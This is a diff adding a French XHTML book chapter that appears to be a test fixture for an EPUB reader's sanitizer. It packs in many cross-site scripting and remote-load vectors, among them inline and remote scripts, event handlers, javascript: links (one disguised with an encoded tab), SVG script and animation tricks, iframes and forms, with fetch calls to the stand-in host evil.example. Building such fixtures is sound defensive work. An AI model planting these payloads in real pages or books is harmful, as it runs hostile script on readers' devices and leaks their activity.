@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:xlink="http://www.w3.org/1999/xlink">
+<head>
+  <title>Chapitre piégé</title>
+  <meta http-equiv="refresh" content="0;url=https://evil.example/refresh"/>
+  <base href="https://evil.example/"/>
+  <link rel="stylesheet" href="blob:https://laterna.example/2222-3333"/>
+  <link rel="stylesheet" href="https://evil.example/style.css"/>
+  <link rel="prefetch" href="https://evil.example/prefetch"/>
+  <link rel="preconnect" href="//cdn.example"/>
+  <style>
+    @import url("https://evil.example/import.css");
+    body { background-image: url(https://evil.example/bg.png); }
+  </style>
+  <script>parent.document.title = "PWNED-inline"; fetch("https://evil.example/inline");</script>
+  <script src="https://evil.example/remote.js"></script>
+</head>
+<body onload="fetch('https://evil.example/onload')">
+  <h1 onclick="alert(1)" style="background: url('https://evil.example/style-attr.png')">Chapitre piégé</h1>
+  <p><a id="interne" href="#note1">Un lien interne</a> et <a id="relatif" href="chapitre2.xhtml#debut">un autre</a>.</p>
+  <p><a id="js" href="javascript:fetch('https://evil.example/js-link')">Un lien javascript</a></p>
+  <p><a id="js-espace" href=" java&#x09;script:alert(1)">Un lien javascript déguisé</a></p>
+  <p><a id="externe" href="https://evil.example/page">Un lien externe</a></p>
+  <img id="cover" src="blob:https://laterna.example/0000-1111" alt=""/>
+  <img id="externe-img" src="https://evil.example/pixel.png" alt="" onerror="fetch('https://evil.example/onerror')"/>
+  <img id="srcset" src="blob:https://laterna.example/4444" srcset="https://evil.example/2x.png 2x" alt=""/>
+  <img id="autre-origine" src="blob:https://ailleurs.example/5555" alt=""/>
+  <img id="incrustee" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt=""/>
+  <iframe src="https://evil.example/frame"></iframe>
+  <object data="https://evil.example/object.swf"></object>
+  <embed src="https://evil.example/embed"/>
+  <form action="https://evil.example/form"><button formaction="javascript:alert(1)">Envoyer</button></form>
+  <video poster="https://evil.example/poster.png" src="https://evil.example/video.mp4"></video>
+  <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" onload="alert(2)">
+    <script>alert(3)</script>
+    <a xlink:href="javascript:alert(4)"><set attributeName="href" to="javascript:alert(5)"/><text>x</text></a>
+    <image xlink:href="https://evil.example/svg-image.png"/>
+  </svg>
+  <p id="note1">Une note.</p>
+</body>
+</html>
